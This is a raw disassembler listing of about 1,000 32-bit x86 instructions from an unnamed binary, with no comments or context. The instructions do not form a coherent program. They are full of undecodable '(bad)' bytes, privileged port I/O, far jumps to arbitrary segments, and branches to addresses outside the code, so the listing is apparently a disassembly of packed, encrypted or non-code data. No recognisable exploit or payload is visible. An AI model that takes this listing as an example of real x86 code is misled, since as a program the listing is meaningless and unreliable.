  413c8f:	test   dl,cl
  413c91:	sub    edi,ebx
  413c93:	xchg   BYTE PTR [eax+0x64],al
  413c96:	shl    BYTE PTR [edi+0x78],0x65
  413c9a:	xlat   BYTE PTR ds:[ebx]
  413c9b:	mov    cl,0x9a
  413c9d:	not    dh
  413c9f:	ret    0x2e3e
  413ca2:	imul   esi,DWORD PTR [edi],0x9d7add52
  413ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca9:	retf   
  413caa:	add    dl,BYTE PTR [ebx+0x538f4e99]
  413cb0:	sbb    DWORD PTR [ecx],esi
  413cb2:	inc    edi
  413cb3:	test   BYTE PTR [ecx+0x62b4a8b7],0x6d
  413cba:	pop    ds
  413cbb:	xchg   ecx,eax
  413cbc:	mov    ds:0x21fc62c7,al
  413cc1:	les    eax,FWORD PTR [eax+eiz*2-0x69b6a552]
  413cc8:	mov    eax,0x811121fc
  413ccd:	pushf  
  413cce:	xchg   ecx,eax
  413ccf:	push   esp
  413cd0:	pushf  
  413cd1:	in     al,0x9a
  413cd3:	fistp  WORD PTR [ecx-0x42f820ab]
  413cd9:	adc    BYTE PTR [edi+0x5f],bl
  413cdc:	push   es
  413cdd:	retf   0x538d
  413ce0:	fidivr DWORD PTR [edx+0x42]
  413ce3:	xor    al,BYTE PTR [eax-0x47f71db]
  413ce9:	and    BYTE PTR [esi+0x2d],bl
  413cec:	and    ecx,0x23
  413cef:	fld    TBYTE PTR [ecx+0x61]
  413cf2:	aas    
  413cf3:	push   esi
  413cf4:	cmp    DWORD PTR [ecx-0x3a5299da],0x27f32ddd
  413cfe:	xchg   DWORD PTR [ecx-0x4c],ebp
  413d01:	std    
  413d02:	xor    ch,BYTE PTR [esi-0x70c2f9da]
  413d08:	xchg   edi,eax
  413d09:	pop    edi
  413d0a:	call   FWORD PTR [edx-0x21323308]
  413d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d11:	pop    ebx
  413d12:	lahf   
  413d13:	mov    al,ds:0x7caa3c6b
  413d18:	add    cl,0x93
  413d1b:	call   DWORD PTR [edx]
  413d1d:	je     0x413d47
  413d1f:	add    BYTE PTR [eax-0x5e0e3f05],0x41
  413d26:	push   ss
  413d27:	mov    al,0xdd
  413d29:	(bad)  
  413d2b:	push   ebx
  413d2c:	mov    ?,WORD PTR [eax+0x5a]
  413d2f:	mov    ecx,0xdd786c
  413d34:	lsl    edi,sp
  413d37:	sub    ecx,DWORD PTR [esi+0x61]
  413d3a:	shl    BYTE PTR ds:0x8711d646,1
  413d40:	fwait
  413d41:	adc    al,0xc5
  413d43:	and    DWORD PTR [ecx],edx
  413d45:	mov    edi,0x514d39fd
  413d4a:	in     al,dx
  413d4b:	not    DWORD PTR [ebp-0x40b6d958]
  413d51:	push   0xf8cef0ff
  413d56:	jb     0x413d62
  413d58:	lods   al,BYTE PTR ds:[esi]
  413d59:	aad    0xa
  413d5b:	scas   eax,DWORD PTR es:[edi]
  413d5c:	rcr    BYTE PTR ds:0xa19add4d,1
  413d62:	loope  0x413d85
  413d64:	jmp    0xa60065a4
  413d69:	push   ss
  413d6a:	mov    ebp,0x6f326256
  413d6f:	mov    WORD PTR [esi-0x311d030a],?
  413d75:	sub    eax,DWORD PTR [ebx+0x772bf40a]
  413d7b:	std    
  413d7c:	outs   dx,DWORD PTR ds:[esi]
  413d7d:	aam    0x4f
  413d7f:	inc    ebp
  413d80:	sub    eax,0x2d844cfd
  413d85:	mov    ecx,0x1f8dfd51
  413d8a:	push   ds
  413d8b:	pop    ss
  413d8c:	push   ebp
  413d8d:	mov    edi,0x792aede8
  413d92:	repnz and eax,DWORD PTR [ecx+0xad20703]
  413d99:	lods   al,BYTE PTR ds:[esi]
  413d9a:	std    
  413d9b:	ret    0x58c7
  413d9e:	xor    eax,0xd0410f3d
  413da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413da4:	bound  esi,QWORD PTR [ecx-0x1c8edc3c]
  413daa:	xchg   ecx,eax
  413dab:	add    eax,0x1341e826
  413db0:	sbb    cl,BYTE PTR [ecx]
  413db2:	push   0x74
  413db4:	push   0x2868bac
  413db9:	neg    BYTE PTR [edx]
  413dbb:	push   ebx
  413dbc:	hlt    
  413dbd:	retf   
  413dbe:	jmp    DWORD PTR [ebx+0x10]
  413dc1:	lods   eax,DWORD PTR ds:[esi]
  413dc2:	jmp    0x9ee9f8da
  413dc7:	jnp    0x413e1d
  413dc9:	cdq    
  413dca:	and    edi,DWORD PTR [ecx]
  413dcc:	sbb    dl,BYTE PTR [eax+0x3d92b190]
  413dd2:	mov    WORD PTR [edx+edx*2-0x25],ds
  413dd6:	gs inc ecx
  413dd8:	mov    al,0xc4
  413dda:	in     eax,0xeb
  413ddc:	jecxz  0x413de1
  413dde:	pop    eax
  413ddf:	jg     0x413d95
  413de1:	mov    esi,0xb435ccba
  413de6:	std    
  413de7:	mov    eax,0x9504157c
  413dec:	mov    bl,0xd8
  413dee:	cmp    bh,BYTE PTR [ecx]
  413df0:	or     BYTE PTR [ebx+0x2a5c427d],bl
  413df6:	pinsrw mm3,WORD PTR [eax-0x2c],0x87
  413dfb:	jle    0x413e5c
  413dfd:	and    BYTE PTR [ecx+edi*4+0x35],al
  413e01:	and    bl,BYTE PTR [edi+0xeef08a0]
  413e07:	jmp    0x5485e110
  413e0c:	les    edx,FWORD PTR [edi]
  413e0e:	pop    esi
  413e0f:	das    
  413e10:	das    
  413e11:	jno    0x413d9e
  413e13:	loopne 0x413e94
  413e15:	stc    
  413e16:	stc    
  413e17:	mov    eax,ds:0xe4227ed8
  413e1c:	rcr    DWORD PTR [esi+eiz*8-0x43114261],0x29
  413e24:	retf   0xe661
  413e27:	add    DWORD PTR ds:0x605e8ed8,0x9adf01f4
  413e31:	scas   al,BYTE PTR es:[edi]
  413e32:	inc    ebp
  413e33:	jecxz  0x413e57
  413e35:	push   ebp
  413e36:	ja     0x413ea7
  413e38:	xlat   BYTE PTR ds:[ebx]
  413e39:	and    eax,0xca1c8f22
  413e3e:	mov    ecx,0xef93cff6
  413e43:	lods   eax,DWORD PTR ds:[esi]
  413e44:	adc    ah,BYTE PTR [ecx+0x40]
  413e47:	push   esi
  413e48:	pop    DWORD PTR [esi-0x3be83c15]
  413e4e:	jmp    0xe6ce:0xc0ef2928
  413e55:	inc    esp
  413e56:	arpl   WORD PTR [ebx],di
  413e58:	inc    esp
  413e59:	add    edx,ebx
  413e5b:	(bad)  
  413e5c:	mov    cl,0xd9
  413e5e:	enter  0xfb45,0x72
  413e62:	xchg   ebx,eax
  413e63:	jbe    0x413e42
  413e65:	push   edi
  413e66:	mov    ?,WORD PTR [edx+0x299a916f]
  413e6c:	pop    esp
  413e6d:	mov    edi,0x7b6c83
  413e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e73:	mov    fs:0xdfea4002,al
  413e79:	in     eax,dx
  413e7a:	push   cs
  413e7b:	xchg   edi,eax
  413e7c:	add    bl,cl
  413e7e:	ret    0xadc3
  413e81:	call   0x7b5feabc
  413e86:	fwait
  413e87:	lea    esp,[edx+0x41]
  413e8a:	cld    
  413e8b:	shr    dl,1
  413e8d:	cld    
  413e8e:	dec    edx
  413e8f:	xchg   BYTE PTR [edi-0x2f78ed69],dh
  413e95:	outs   dx,DWORD PTR ds:[esi]
  413e96:	loope  0x413e18
  413e98:	mov    al,0xcc
  413e9a:	push   ebx
  413e9b:	cmp    edx,DWORD PTR [esi]
  413e9d:	mov    DWORD PTR [eax],0x5da97017
  413ea3:	hlt    
  413ea4:	neg    BYTE PTR [edi]
  413ea6:	ja     0x413eaf
  413ea8:	repz push edi
  413eaa:	out    dx,al
  413eab:	test   DWORD PTR [ebp+0x37],ebx
  413eae:	xchg   edi,eax
  413eaf:	ja     0x413e4b
  413eb1:	les    esp,FWORD PTR [esi+esi*8]
  413eb4:	mov    ds:0x3e9a561e,al
  413eb9:	out    0x56,eax
  413ebb:	jl     0x413e73
  413ebd:	pusha  
  413ebe:	rol    BYTE PTR ds:0x4eda375e,cl
  413ec4:	jl     0x413e6e
  413ec6:	adc    al,0x63
  413ec8:	(bad)  
  413ec9:	and    ch,BYTE PTR [ebx-0x33e8ff19]
  413ecf:	mov    dh,BYTE PTR [edx+0x160271d7]
  413ed5:	pop    eax
  413ed6:	or     DWORD PTR [edx],edi
  413ed8:	and    al,dh
  413eda:	or     al,0xfd
  413edc:	out    dx,al
  413edd:	mov    ebx,0xdce4ecaa
  413ee2:	mov    ecx,0x28791966
  413ee7:	xchg   esi,eax
  413ee8:	xchg   edi,eax
  413ee9:	fwait
  413eea:	jp     0x413ed3
  413eec:	inc    esp
  413eed:	out    dx,al
  413eee:	jns    0x413e8f
  413ef0:	sub    eax,0x897d27bd
  413ef5:	adc    al,0x26
  413ef7:	xor    ecx,esi
  413ef9:	test   BYTE PTR [ebx+0x43],ch
  413efc:	ins    BYTE PTR es:[edi],dx
  413efd:	repz pop esi
  413eff:	jmp    0x413f54
  413f01:	and    BYTE PTR [edi+0x47a97286],bl
  413f07:	lock mov BYTE PTR [esi],ch
  413f0a:	dec    BYTE PTR [eax-0x42]
  413f0d:	mov    ebp,0x2a076fd
  413f12:	clc    
  413f13:	test   BYTE PTR [ebx],cl
  413f15:	pop    ebx
  413f16:	jecxz  0x413eda
  413f18:	sub    al,0xa4
  413f1a:	xor    DWORD PTR [eax-0x51c9b0f4],ebx
  413f20:	xchg   ebx,eax
  413f21:	dec    eax
  413f22:	push   ebp
  413f23:	mov    edx,0x89b0a487
  413f28:	pop    ebx
  413f29:	dec    edi
  413f2a:	hlt    
  413f2b:	(bad)  
  413f2c:	out    dx,al
  413f2d:	sbb    ebp,DWORD PTR [ebx+0x5182ba41]
  413f33:	jecxz  0x413fa8
  413f35:	outs   dx,BYTE PTR ds:[esi]
  413f36:	mov    ds:0x72ca3883,eax
  413f3b:	aas    
  413f3c:	push   0x27
  413f3e:	iret   
  413f3f:	repz push ds
  413f41:	call   0xe306b21d
  413f46:	mov    eax,0xa6dec343
  413f4b:	mov    edx,0xa61f8a01
  413f50:	(bad)  
  413f51:	mov    ch,0xda
  413f53:	adc    eax,0x62de84b5
  413f58:	popa   
  413f59:	or     esi,DWORD PTR [edi]
  413f5b:	dec    ebp
  413f5c:	out    dx,al
  413f5d:	and    al,0x8
  413f5f:	sbb    al,0xdc
  413f61:	sub    DWORD PTR [ebp-0x2139bd96],0x3f
  413f68:	leave  
  413f69:	jno    0x413fb5
  413f6b:	mov    DWORD PTR [ebp+0x7a2070fd],edi
  413f71:	addr16 call 0x6c21:0xd4a8295f
  413f79:	outs   dx,BYTE PTR ds:[esi]
  413f7a:	pushf  
  413f7b:	int    0xd2
  413f7d:	adc    edx,edx
  413f7f:	inc    ebp
  413f80:	jo     0x413feb
  413f82:	call   0xb1e8:0xbf9b578d
  413f89:	mov    edi,0x740d95b5
  413f8e:	std    
  413f8f:	and    ebp,0xabcf0bb0
  413f95:	cmp    BYTE PTR [ebx-0x36],0xbe
  413f99:	dec    ebx
  413f9a:	dec    ebx
  413f9b:	fild   WORD PTR [edi+0x6092db2e]
  413fa1:	(bad)  
  413fa2:	sub    DWORD PTR [ebx+0x15],ebp
  413fa5:	(bad)  
  413fa7:	xor    eax,DWORD PTR [ebx]
  413fa9:	inc    esi
  413faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fab:	xor    dh,BYTE PTR [esi+ebx*2+0x5a2b0633]
  413fb2:	jae    0x413f51
  413fb4:	leave  
  413fb5:	push   ebx
  413fb6:	aaa    
  413fb7:	cmp    ebp,ecx
  413fb9:	inc    ebx
  413fba:	(bad)  
  413fbb:	aam    0x89
  413fbd:	xchg   ebx,eax
  413fbe:	jmp    0xe3796fbc
  413fc3:	ss nop
  413fc5:	mov    dl,0xe6
  413fc7:	push   0xffffffdb
  413fc9:	jns    0x413f6e
  413fcb:	cmc    
  413fcc:	and    DWORD PTR [edi-0x7d],esp
  413fcf:	imul   esp,DWORD PTR ds:0x5675b4ae,0xffffffa3
  413fd6:	shr    DWORD PTR [ecx-0x44],0xa8
  413fda:	pusha  
  413fdb:	mov    ah,0x32
  413fdd:	lock mov eax,ds:0x476f8475
  413fe3:	rcr    ah,cl
  413fe5:	jle    0x413f72
  413fe7:	mov    ds:0x97fb89e,al
  413fec:	mov    eax,0xb3cc61e4
  413ff1:	std    
  413ff2:	fld    DWORD PTR [ecx*1-0x5c88479d]
  413ff9:	cmp    ebp,DWORD PTR [edi]
  413ffb:	or     ah,BYTE PTR [esi+0x77]
  413ffe:	(bad)  
  414000:	out    dx,al
  414001:	cmc    
  414002:	aad    0x1e
  414004:	clc    
  414005:	pop    ebp
  414006:	mov    bl,0xa8
  414008:	jp     0x413faf
  41400a:	mov    bl,BYTE PTR [ebp+0x2c]
  41400d:	outs   dx,BYTE PTR ds:[esi]
  41400e:	les    ebp,FWORD PTR [ebp+0x5014ef28]
  414014:	pop    edi
  414015:	xor    DWORD PTR [esi],0x4413cda4
  41401b:	(bad)  
  41401c:	jo     0x41404b
  41401e:	pusha  
  41401f:	jbe    0x41406f
  414021:	jb     0x413ff2
  414023:	repnz add DWORD PTR [eax],ecx
  414026:	adc    al,0xaa
  414028:	aam    0xfd
  41402a:	sbb    al,0xf8
  41402c:	jmp    0xa76f:0xe0fed890
  414033:	(bad)  
  414034:	ins    BYTE PTR es:[edi],dx
  414035:	loope  0x413fdb
  414037:	jmp    0xcda1629
  41403c:	repz add DWORD PTR [ebx+eax*4],esp
  414040:	iret   
  414041:	mov    ebp,0x49b31266
  414046:	je     0x413fca
  414048:	and    ebx,DWORD PTR [ebx-0x153a46fd]
  41404e:	sub    BYTE PTR [ebx-0x6600a5ca],bl
  414054:	jmp    DWORD PTR [ecx]
  414056:	dec    ebx
  414057:	pop    ds
  414058:	stc    
  414059:	sti    
  41405a:	fsub   DWORD PTR [eax+0x45]
  41405d:	pop    esi
  41405e:	out    dx,eax
  41405f:	dec    ebx
  414060:	push   ecx
  414061:	mov    ebp,0xd78f5a53
  414066:	adc    bl,BYTE PTR [ebx]
  414068:	fmul   DWORD PTR [ebp-0x758b5b7f]
  41406e:	aaa    
  41406f:	or     eax,0xed54b25d
  414074:	jns    0x413ffe
  414076:	scas   al,BYTE PTR es:[edi]
  414077:	pop    esi
  414078:	adc    al,0x0
  41407a:	jcxz   0x4140bb
  41407d:	icebp  
  41407e:	repz or al,BYTE PTR [ebx]
  414081:	fisttp DWORD PTR [eax+ebp*1-0x6b8d36f1]
  414088:	jnp    0x41402f
  41408a:	add    al,0xa7
  41408c:	fsub   DWORD PTR [edi+0x4ca18707]
  414092:	dec    edi
  414093:	dec    edi
  414094:	mov    esp,DWORD PTR [bp+si]
  414097:	test   ch,dh
  414099:	idiv   BYTE PTR [ecx+edi*8+0xc]
  41409d:	push   cs
  41409e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409f:	imul   esp,DWORD PTR [ebp+0x65d08e6f],0x2c
  4140a6:	(bad)  
  4140a7:	mov    cl,BYTE PTR [eax+0x5290c66c]
  4140ad:	inc    ebx
  4140ae:	dec    edi
  4140af:	jns    0x414086
  4140b1:	or     ebp,DWORD PTR [edi-0x79576c10]
  4140b7:	push   ebx
  4140b8:	enter  0x750d,0xd6
  4140bc:	cwde   
  4140bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140be:	nop
  4140bf:	mov    ch,0xe2
  4140c1:	mov    al,ds:0xdd8bd5e8
  4140c6:	add    dl,BYTE PTR [edi]
  4140c8:	and    DWORD PTR [edi+0x15],eax
  4140cb:	xor    ebx,esp
  4140cd:	dec    ecx
  4140ce:	inc    esp
  4140cf:	cmc    
  4140d0:	cld    
  4140d1:	neg    BYTE PTR [eax-0x4643e707]
  4140d7:	ss aas 
  4140d9:	loop   0x4140e5
  4140db:	ficom  DWORD PTR [esi+ebx*4-0x37dd4951]
  4140e2:	in     eax,0xe8
  4140e4:	arpl   WORD PTR [ebx+0x7102ee88],di
  4140ea:	cmp    eax,0xdfff7f13
  4140ef:	xchg   BYTE PTR [ecx],ah
  4140f1:	mov    DWORD PTR [ebx-0x5b6db7],eax
  4140f7:	in     al,0xfb
  4140f9:	out    dx,eax
  4140fa:	dec    edx
  4140fb:	or     eax,0x2246563b
  414100:	add    al,0xc
  414102:	cmp    BYTE PTR cs:[ebp+0x7d],ch
  414106:	shr    DWORD PTR [edx-0x51],1
  414109:	(bad)  
  41410a:	mov    ebx,0x4c529c32
  41410f:	mov    esi,0x64a8d6d7
  414114:	jp     0x414132
  414116:	xor    esp,ebp
  414118:	push   eax
  414119:	adc    DWORD PTR [ebx],ebp
  41411b:	mov    eax,ds:0xc17a3ed8
  414120:	and    esp,0x36743f84
  414126:	loopne 0x414155
  414128:	jno    0x4140f3
  41412a:	xchg   ebx,eax
  41412b:	push   ecx
  41412c:	mov    ds:0x7e0a53a2,al
  414131:	inc    edi
  414132:	lahf   
  414133:	test   al,0x6c
  414135:	xor    BYTE PTR [ecx+0x1e],ah
  414138:	jb     0x4140cd
  41413a:	repnz (bad) 
  41413c:	jg     0x414120
  41413e:	xchg   esp,eax
  41413f:	lahf   
  414140:	adc    DWORD PTR [edx+0x40],ebx
  414143:	sbb    DWORD PTR [edi-0x45754f6b],0x25
  41414a:	cmp    DWORD PTR [ecx-0x6b91e590],esp
  414150:	pop    ebp
  414151:	scas   eax,DWORD PTR es:[edi]
  414152:	mov    al,0x5f
  414154:	xor    esp,DWORD PTR [ebp-0x7acbfb66]
  41415a:	lods   eax,DWORD PTR ds:[esi]
  41415b:	push   cs
  41415c:	out    0x3e,al
  41415e:	and    eax,0x1275642a
  414163:	pop    ebp
  414164:	mov    eax,0xf2bbb7db
  414169:	out    dx,al
  41416a:	inc    esi
  41416b:	std    
  41416c:	in     eax,0x56
  41416e:	and    ah,BYTE PTR [ebx]
  414170:	lods   eax,DWORD PTR ds:[esi]
  414171:	dec    ebp
  414172:	dec    esp
  414173:	in     al,0x6d
  414175:	xchg   esi,eax
  414176:	jmp    0x932c:0x4f7ee67f
  41417d:	popf   
  41417e:	hlt    
  41417f:	leave  
  414180:	cmp    al,0xa
  414182:	xor    eax,0x527bef0a
  414187:	pop    ecx
  414188:	xchg   ebp,eax
  414189:	cmp    al,BYTE PTR [edx]
  41418b:	vsubss xmm0,xmm3,xmm7
  41418f:	mov    eax,ds:0x9ff9d9ff
  414194:	inc    eax
  414195:	cmc    
  414196:	jp     0x41412a
  414198:	mov    ch,0x4a
  41419a:	push   0x9
  41419c:	xchg   ecx,eax
  41419d:	out    dx,al
  41419e:	in     eax,dx
  41419f:	fild   DWORD PTR [edx]
  4141a1:	scas   al,BYTE PTR es:[edi]
  4141a2:	adc    al,0x37
  4141a4:	pop    ebp
  4141a5:	dec    eax
  4141a6:	cmp    ch,BYTE PTR ds:0x1e7aed5d
  4141ac:	ins    DWORD PTR es:[edi],dx
  4141ad:	int    0xc6
  4141af:	retf   
  4141b0:	xor    esp,ecx
  4141b2:	das    
  4141b3:	(bad)  
  4141b4:	mov    eax,0x446ab33d
  4141b9:	lods   al,BYTE PTR ds:[esi]
  4141ba:	jbe    0x41421a
  4141bc:	jl     0x4141c4
  4141be:	mov    ds:0x241de070,al
  4141c3:	inc    ecx
  4141c4:	arpl   WORD PTR [ebp-0x1c21de0a],si
  4141ca:	(bad)  
  4141cb:	jp     0x4141dc
  4141cd:	addr16 inc ecx
  4141cf:	popa   
  4141d0:	add    DWORD PTR [edx*4+0x12a60973],0xffffffa8
  4141d8:	mov    dh,0x93
  4141da:	sbb    al,0x3
  4141dc:	inc    ebx
  4141dd:	das    
  4141de:	imul   ebp,DWORD PTR ds:0x6e7c318f,0x7d37da49
  4141e8:	cmc    
  4141e9:	jmp    0xc3e4:0x7e1a52e5
  4141f0:	push   cs
  4141f1:	loope  0x4141c8
  4141f3:	out    dx,eax
  4141f4:	inc    eax
  4141f5:	test   eax,0xaf3bd889
  4141fa:	daa    
  4141fb:	(bad)  
  4141fc:	out    0x85,eax
  4141fe:	loopne 0x4141a0
  414200:	loope  0x41426d
  414202:	fdivr  QWORD PTR [ebx-0x5acf6cc]
  414208:	scas   eax,DWORD PTR es:[edi]
  414209:	xchg   ecx,eax
  41420a:	ja     0x4141c9
  41420c:	aam    0xb0
  41420e:	scas   al,BYTE PTR es:[edi]
  41420f:	or     DWORD PTR [esi+0x5a75c6e8],edi
  414215:	xchg   ecx,eax
  414216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414217:	aad    0x23
  414219:	in     eax,dx
  41421a:	inc    eax
  41421b:	mov    ecx,0x8a78f932
  414220:	popf   
  414221:	push   ebp
  414222:	dec    eax
  414223:	cmp    edx,ebp
  414225:	xor    eax,0x795414d7
  41422a:	ret    
  41422b:	fmul   QWORD PTR [esi+0x7f]
  41422e:	inc    edx
  41422f:	cli    
  414230:	add    eax,0x329f93ff
  414235:	xchg   edx,eax
  414236:	sbb    BYTE PTR [edi-0x40a2bc9c],dh
  41423c:	rcl    BYTE PTR [ebp+0x712b1e4b],1
  414242:	aaa    
  414243:	mov    ebx,0x46ce2a1c
  414248:	jns    0x4141e2
  41424a:	aaa    
  41424b:	out    dx,eax
  41424c:	aas    
  41424d:	rcr    BYTE PTR [edi],0x43
  414250:	mov    ecx,0xe214bc7c
  414255:	xchg   ebp,eax
  414256:	ror    DWORD PTR [esi+0x53853f1c],1
  41425c:	cli    
  41425d:	xchg   DWORD PTR [edi+ebx*8-0x2a226d1],edx
  414264:	sbb    dh,BYTE PTR [bx+0x35]
  414268:	or     dl,bh
  41426a:	cmc    
  41426b:	xor    al,0x9f
  41426d:	or     al,0xa9
  41426f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414270:	and    BYTE PTR [edx-0xee84494],cl
  414276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414277:	std    
  414278:	sub    al,0xe4
  41427a:	stos   BYTE PTR es:[edi],al
  41427b:	jne    0x414259
  41427d:	in     al,0xf7
  41427f:	fwait
  414280:	dec    ebx
  414281:	data16 je 0x4142bd
  414284:	xor    BYTE PTR [edi-0xc],dh
  414287:	push   ebp
  414288:	mov    bh,0xaa
  41428a:	into   
  41428b:	cmp    edx,DWORD PTR [edi+ecx*2]
  41428e:	dec    esi
  41428f:	and    eax,0x6e9675da
  414294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414295:	sub    DWORD PTR [edx+ebp*1],0xffffffb1
  414299:	cmp    eax,0x92e0b10d
  41429e:	add    al,0x97
  4142a1:	repz inc eax
  4142a3:	loop   0x4142d5
  4142a5:	rcl    DWORD PTR [edx],cl
  4142a7:	mov    al,cl
  4142a9:	and    ebp,ebp
  4142ab:	mov    WORD PTR [ecx+0xc],ss
  4142ae:	in     al,dx
  4142af:	imul   esi,edi,0x1e61579c
  4142b5:	ja     0x4142bb
  4142b7:	or     al,0x24
  4142b9:	fisubr WORD PTR [ebp+0x10964e7]
  4142bf:	shl    ch,1
  4142c1:	fild   WORD PTR [ecx+0x53]
  4142c4:	dec    esi
  4142c5:	lahf   
  4142c6:	and    BYTE PTR [esi],cl
  4142c8:	xor    al,0xfb
  4142ca:	jb     0x4142aa
  4142cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142cd:	int    0xdf
  4142cf:	call   0x7f0132dd
  4142d4:	cld    
  4142d5:	adc    al,0x3b
  4142d7:	inc    edx
  4142d8:	adc    DWORD PTR [esi],esi
  4142da:	pop    ebx
  4142db:	pop    ds
  4142dc:	in     al,0x50
  4142de:	(bad)  
  4142df:	(bad)
  4142e2:	sbb    esi,edi
  4142e4:	shl    BYTE PTR [ecx],1
  4142e6:	inc    esi
  4142e7:	cmp    DWORD PTR [ecx+ecx*1+0x594ed8c4],ebx
  4142ee:	out    0xae,eax
  4142f0:	push   ebp
  4142f1:	into   
  4142f2:	add    eax,0x3ad24ca5
  4142f7:	call   0x571795ca
  4142fc:	out    dx,eax
  4142fd:	shl    ebp,1
  4142ff:	rcr    BYTE PTR [esi],0x5d
  414302:	ds pop ebx
  414304:	in     al,0x52
  414306:	adc    esi,edx
  414308:	repz jg 0x41435e
  41430b:	jo     0x41437f
  41430d:	inc    esi
  41430e:	sbb    DWORD PTR [ebx],ecx
  414310:	or     bl,BYTE PTR [eax+0x4f]
  414313:	mov    eax,ds:0xb76df4e8
  414318:	cwde   
  414319:	in     al,dx
  41431a:	rcr    esi,1
  41431c:	and    eax,0xc399ead1
  414321:	dec    eax
  414322:	call   0xc7eef8a1
  414327:	dec    ecx
  414328:	xlat   BYTE PTR ds:[ebx]
  414329:	xor    BYTE PTR [eax],al
  41432b:	inc    ebx
  41432c:	imul   eax,DWORD PTR [eax+0x7],0xffffffdf
  414330:	push   ecx
  414331:	or     eax,0x78c6599
  414336:	dec    ebp
  414337:	lods   al,BYTE PTR ds:[esi]
  414338:	jmp    0x41437d
  41433a:	mov    bl,0x72
  41433c:	mov    ebp,0x5b9fc01b
  414341:	sbb    BYTE PTR [edx+0x11d182bc],cl
  414347:	imul   ebp,DWORD PTR [ebx+0x4f],0x6fd8e726
  41434e:	or     BYTE PTR [edx],ch
  414350:	xchg   esp,eax
  414351:	(bad)
  414356:	mov    bl,ch
  414358:	or     al,0xe9
  41435a:	pushf  
  41435b:	mov    ch,0x10
  41435d:	cmp    al,0x47
  41435f:	ror    DWORD PTR [edi-0x67],cl
  414362:	mov    esp,0x9f02f650
  414367:	push   esp
  414368:	xor    ebp,ecx
  41436a:	push   edx
  41436b:	imul   edx,ebp,0x58
  41436e:	fnstcw WORD PTR [ebp-0x14]
  414371:	(bad)  
  414372:	push   es
  414373:	cdq    
  414374:	test   ch,0x2b
  414377:	push   cs
  414378:	sbb    bh,BYTE PTR [esi-0x12e08dfe]
  41437e:	in     eax,0x13
  414380:	push   edi
  414381:	jmp    0x6daf4427
  414386:	inc    edx
  414387:	push   esi
  414388:	dec    ebp
  414389:	add    esi,DWORD PTR [edx]
  41438b:	in     eax,0xd8
  41438d:	shl    BYTE PTR [edi-0x2c],1
  414390:	add    DWORD PTR [eax-0x1b],edx
  414393:	scas   eax,DWORD PTR es:[edi]
  414394:	mov    esi,0xee310c15
  414399:	push   0x1
  41439b:	mov    ecx,0xa6c6841b
  4143a0:	mov    bh,0xed
  4143a2:	fidivr WORD PTR [eax]
  4143a4:	mov    cl,0x2b
  4143a6:	jnp    0x41436e
  4143a8:	and    al,0xa7
  4143aa:	xchg   ecx,eax
  4143ab:	rcl    bl,cl
  4143ad:	jecxz  0x414345
  4143af:	sbb    bl,dl
  4143b1:	add    al,0xb0
  4143b3:	cld    
  4143b4:	xchg   ebp,eax
  4143b5:	push   0xffffff91
  4143b7:	bound  esi,QWORD PTR [esi+0x5c]
  4143ba:	aam    0x4b
  4143bc:	test   eax,0xf5becf23
  4143c1:	xchg   BYTE PTR [edi-0x6998dbf8],dl
  4143c7:	mov    ds:0xa3fb80c4,al
  4143cc:	std    
  4143cd:	pusha  
  4143ce:	xor    eax,0x85dc9d10
  4143d3:	jl     0x41438c
  4143d5:	add    al,0x3a
  4143d7:	mov    dh,0x30
  4143d9:	scas   eax,DWORD PTR es:[edi]
  4143da:	js     0x414373
  4143dc:	xchg   esp,eax
  4143dd:	mov    ch,0x59
  4143df:	das    
  4143e0:	dec    ebx
  4143e1:	sub    esi,esi
  4143e3:	stos   DWORD PTR es:[edi],eax
  4143e4:	adc    al,0x43
  4143e6:	cmp    DWORD PTR [ebx-0x1f9c3af8],ecx
  4143ec:	in     eax,0x67
  4143ee:	sbb    al,0xc2
  4143f0:	xor    al,0x80
  4143f2:	retf   
  4143f3:	jno    0x41446c
  4143f5:	cld    
  4143f6:	call   0x4851:0x566a0c0f
  4143fd:	push   ebx
  4143fe:	pop    ss
  4143ff:	push   edi
  414400:	inc    eax
  414401:	aad    0x6d
  414403:	sub    al,0x53
  414405:	daa    
  414406:	add    BYTE PTR [ecx+eax*1+0x21d32063],ch
  41440d:	js     0x4143b3
  41440f:	adc    eax,0x6a83fbc0
  414414:	sbb    DWORD PTR [ebp+0x37c8d03],ebx
  41441a:	inc    esi
  41441b:	jecxz  0x4143b7
  41441d:	test   al,0x93
  41441f:	jbe    0x4143a4
  414421:	adc    esi,edx
  414423:	jmp    0x15ce32da
  414428:	fnstcw WORD PTR [eax+edi*2-0x630d3e0a]
  41442f:	(bad)  
  414431:	outs   dx,BYTE PTR ds:[esi]
  414432:	mov    al,0x5e
  414434:	cmp    al,0x69
  414436:	bound  ebp,QWORD PTR [esi]
  414438:	pushf  
  414439:	sbb    al,0x4f
  41443b:	dec    ecx
  41443c:	in     al,dx
  41443d:	jns    0x4143d1
  41443f:	in     eax,0xfb
  414441:	mov    esp,0xd7e302ae
  414446:	fnstcw WORD PTR [ebp+eax*2+0xd9a6bc4]
  41444d:	xor    eax,0xf85a544d
  414452:	inc    ebp
  414453:	cld    
  414454:	add    esi,DWORD PTR [ecx]
  414456:	scas   eax,DWORD PTR es:[edi]
  414457:	mov    al,ds:0x55ea08b0
  41445c:	out    0x98,eax
  41445e:	pop    ecx
  41445f:	inc    edx
  414460:	out    0xe0,eax
  414462:	and    BYTE PTR [edi+0x47f66b08],0x72
  414469:	push   ds
  41446a:	cld    
  41446b:	xchg   esp,eax
  41446c:	fstp   TBYTE PTR [ebx-0x6d7a63d8]
  414472:	inc    edi
  414473:	cmp    bl,BYTE PTR [ebx+0xec7efc5]
  414479:	les    ecx,FWORD PTR [eax]
  41447b:	aad    0x57
  41447d:	add    bl,al
  41447f:	aam    0x32
  414481:	dec    edx
  414482:	pusha  
  414483:	nop
  414484:	inc    edi
  414485:	shl    DWORD PTR [ebx],0xf4
